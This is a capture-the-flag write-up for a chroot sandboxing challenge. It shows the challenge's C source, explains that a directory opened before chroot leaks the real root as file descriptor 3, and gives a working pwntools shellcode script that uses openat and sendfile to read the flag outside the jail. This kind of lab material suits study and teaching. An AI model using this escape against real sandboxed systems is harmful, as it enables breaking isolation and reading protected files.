---
title: "Chdir('/') after chroot"
description: "Writeup for Sandboxing Level 3"
date: "2026-01-01"
order: 3
draft: false
---

# Chdir('/') after chroot

## Challenge Source Code

```c
#include <assert.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  assert(argc > 0);

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 1);

  assert(argc > 1);

  // Checking to make sure you're not trying to open the flag.
  assert(strstr(argv[1], "flag") == NULL);

  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);

  char jail_path[] = "/tmp/jail-XXXXXX";
  assert(mkdtemp(jail_path) != NULL);

  assert(chroot(jail_path) == 0);

  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  void *shellcode =
      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANON, 0, 0);
  assert(shellcode == (void *)0x1337000);

  int shellcode_size = read(0, shellcode, 0x1000);

  ((void (*)())shellcode)();
}
```

## Vulnerability Analysis

This level attempts to fix the previous issue by correctly calling `chdir("/")` after `chroot()`. This ensures that the process's current working directory is moved inside the jail, preventing relative path escapes like `../../`.

However, the vulnerability from the previous level persists: the program still opens a user-controlled file (`argv[1]`) **before** the sandbox is initialized.

```c
int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
// ...
assert(chroot(jail_path) == 0);
assert(chdir("/") == 0);
```

Even though our CWD is now safely inside the jail, the file descriptor (FD 3) pointing to the real root (if we pass `/`) remains valid and accessible.

## Exploitation Plan

1.  **Leak the Root FD:** Run the binary with `/` as the argument to open the host's root directory.
2.  **Bypass Sandbox:** Use the `openat` syscall with the leaked file descriptor (FD 3) as the directory base. This allows us to access files relative to the host's root, completely ignoring the current `chroot` and `chdir` state.
3.  **Retrieve Flag:** Open the `flag` file using `openat` and send its content to stdout using `sendfile`.

## Exploit Script

The following Python script uses `pwntools` to automate the exploit. We leverage `shellcraft` to generate the shellcode for the `openat` and `sendfile` syscalls.

```python
from pwn import *

elf = context.binary = ELF("./challenge")

# Pass '/' to leak the root FD (fd 3)
p = process([elf.path, "/"])

# Shellcraft exploit
# Since we are chrooted, we use openat with the leaked FD (3) to access the real flag.
# No seccomp, so we can use any syscall and exit normally.

sc = shellcraft.openat(3, "flag", constants.O_RDONLY)
sc += shellcraft.sendfile(1, 'rax', 0, 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)

p.send(shellcode)
print(p.recvall().decode())
p.close()
```
